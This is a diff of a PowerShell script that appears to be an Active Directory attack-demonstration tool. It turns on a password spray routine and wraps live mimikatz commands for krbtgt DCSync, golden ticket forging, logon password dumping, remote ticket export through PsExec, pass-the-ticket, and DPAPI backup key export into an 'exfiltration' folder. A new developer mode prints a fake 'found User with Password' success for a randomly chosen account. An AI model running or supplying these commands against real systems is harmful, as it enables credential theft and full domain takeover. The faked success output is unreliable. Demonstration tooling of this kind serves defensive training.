@@ -47,8 +47,8 @@ https://herrHoZi.com
 ######                                                                     #####
 ################################################################################
 
-# 2022-11-10 | v2.5.8 |  add developer mode switch and region to source code
-# 2022-11-08 | v2.5.7 |  add developer mode switch and region to source code
+# 2022-11-10 | v2.5.8 |  Attack - Steal or Forge Authentication Certificates
+# 2022-11-08 | v2.5.7 |  add developer mode switch, add -ScriptBlock {} and region to source code
 # 2022-11-04 | v2.5.6 |  ADD Function New-PasswordSprayAttack
 # 2022-10-15 | v2.5.5 |  ADD Function Kerberoasting
 # 2022-10-13 | v2.1.1 |  Update Function Start-AS2GoDemo | Protected User Error Routine
@@ -242,6 +242,12 @@ Write-Log -Message "### Start Function $myfunction ###"
 
 Write-Host "`nCurrent Default Domain Password Policy Settings:" -ForegroundColor $global:FGCHighLight
 Get-ADDefaultDomainPasswordPolicy
+
+$info = Get-ADDefaultDomainPasswordPolicy
+
+Write-Host "Number of failed logon attempts that causes a user account to be locked out is: " -NoNewline
+Write-Host $info.LockoutThreshold -ForegroundColor Yellow
+
 pause
 
 $MyDomain = $env:USERDNSDOMAIN
@@ -280,9 +286,9 @@ Write-Host " users from OU " -NoNewline;Write-Host $MyPath -ForegroundColor Yell
 Write-Host ""
 pause
 
-#Start-PasswordSprayAttack -Domain $MyDomain -Password $MyPW01 -SearchBase $MyPath -NoR "1 of 2"
+Start-PasswordSprayAttack -Domain $MyDomain -Password $MyPW01 -SearchBase $MyPath -NoR "1 of 2"
 
-Invoke-Command -ScriptBlock {.\Rubeus.exe brute /password:$MyPW01 /noticket}
+#Invoke-Command -ScriptBlock {.\Rubeus.exe brute /password:$MyPW01 /noticket}
 
 Start-PasswordSprayAttack -Domain $MyDomain -Password $MyPW02 -SearchBase $MyPath -NoR "2 of 2"
 Write-Host ""
@@ -299,9 +305,17 @@ Function Start-PasswordSprayAttack
 
     $myfunction = Get-FunctionName
     Write-Log -Message "### Start Function $myfunction ###"
+    
+
+    If ($DeveloperMode) {
+      $ADUSers = Get-ADUser -Filter * -SearchBase $SearchBase | Sort-Object{Get-Random} | Select -First 100
+     }
+    else
+     {
+     $ADUSers = Get-Aduser -filter * -SearchBase $SearchBase
+     }
 
         $Step = 0
-        $ADUSers = Get-Aduser -filter * -SearchBase $SearchBase
         $TotalSteps = $ADUsers.Count
         $specChar = [char]0x00BB
         
@@ -318,7 +332,16 @@ Function Start-PasswordSprayAttack
               Write-Host "Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor Yellow -NoNewline
               Write-Host " with Password: " -NoNewline;Write-Host $Password -ForegroundColor Yellow
               }
-         }
+        }
+
+            If ($DeveloperMode) {
+              $ADUSer = Get-ADUser -Filter * -SearchBase $SearchBase | Sort-Object{Get-Random} | Select -First 1
+              $user =   $Domain + "\" + $ADUSer.samaccountname
+              Write-Host "Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor Yellow -NoNewline
+              Write-Host " with Password: " -NoNewline;Write-Host $Password -ForegroundColor Yellow
+             }
+
+
 
 #####
 Write-Log -Message "### End Function $myfunction ###"
@@ -483,7 +506,7 @@ Write-Log -Message "### Start Function $myfunction ###"
         $answer   = Get-Answer -question $question -defaultValue $Yes
         If ($answer -eq $yes)
             {
-            .\mimikatz.exe "log .\$sFakeUser.log" "lsadump::dcsync /domain:$fqdn /user:krbtgt"  "exit"
+            Invoke-Command -ScriptBlock {.\mimikatz.exe "log .\$sFakeUser.log" "lsadump::dcsync /domain:$fqdn /user:krbtgt"  "exit"}
            # Invoke-Command -ScriptBlock {}
             Invoke-Item ".\$sFakeUser.log"
             Pause
@@ -525,7 +548,7 @@ Write-Log -Message "### Start Function $myfunction ###"
         If ($answer -eq $yes)
             {
             
-            .\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$fqdn /sid:$domainsID /rc4:$krbtgtntml /user:$sFakeUser /id:500 /groups:500,501,513,512,520,518,519 /ptt" "exit" 
+            Invoke-Command -ScriptBlock {.\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$fqdn /sid:$domainsID /rc4:$krbtgtntml /user:$sFakeUser /id:500 /groups:500,501,513,512,520,518,519 /ptt" "exit"}
             #Golden ticket for 'FU-20210816.111659 @ threatprotection.corp' successfully submitted for current session
             Pause
             Clear-Host
@@ -1465,7 +1488,7 @@ $answer   = Get-Answer -question $question -defaultValue $Yes
 If ($answer -eq $yes)
 {
     #Invoke-Expression -Command:$command
-    .\mimikatz.exe "log .\$logfile" "privilege::debug" "sekurlsa::logonpasswords" "exit"
+    Invoke-Command -ScriptBlock {.\mimikatz.exe "log .\$logfile" "privilege::debug" "sekurlsa::logonpasswords" "exit"}
     Invoke-Item ".\$helpdeskuser.log"
     Pause
 }
@@ -1607,7 +1630,7 @@ write-host "PsExec.exe \\$mySAW -accepteula cmd /c (cd c:\temp\tickets & mimikat
 write-host ""
 write-host ""
 
-.\PsExec.exe \\$mySAW -accepteula cmd /c ('cd c:\temp\tickets & mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"  "exit"')
+Invoke-Command -ScriptBlock {.\PsExec.exe \\$mySAW -accepteula cmd /c ('cd c:\temp\tickets & mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"  "exit"')}
 Pause
 
 
@@ -1654,7 +1677,7 @@ write-host ""
 write-host ".\mimikatz.exe ""privilege::debug"" ""kerberos::ptt \\$hostname\$ticketsUNCPath"" ""exit""" -ForegroundColor $global:FGCCommand 
 Pause
 Clear-Host
-.\mimikatz.exe "privilege::debug" "kerberos::ptt \\$hostname\$ticketsUNCPath" "exit"
+Invoke-Command -ScriptBlock {.\mimikatz.exe "privilege::debug" "kerberos::ptt \\$hostname\$ticketsUNCPath" "exit"}
 Pause
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
@@ -1709,7 +1732,7 @@ $myfunction = Get-FunctionName
 Write-Log -Message "### Start Function $myfunction ###"
 #####
 
-.\NetSess.exe $server
+Invoke-Command -ScriptBlock {.\NetSess.exe $server}
 
 
 
@@ -2813,7 +2836,7 @@ If ($answer -eq $yes)
     If ($answer -eq $yes)
     {
         New-Item $exfiltration -ItemType directory -ErrorAction Ignore
-        .\mimikatz.exe "cd $exfiltration" "privilege::debug" "lsadump::backupkeys /system:$mydc.$fqdn /export" "exit"
+        Invoke-Command -ScriptBlock {.\mimikatz.exe "cd $exfiltration" "privilege::debug" "lsadump::backupkeys /system:$mydc.$fqdn /export" "exit"}
         dir "$exfiltration\ntds_*"
         Pause
     }
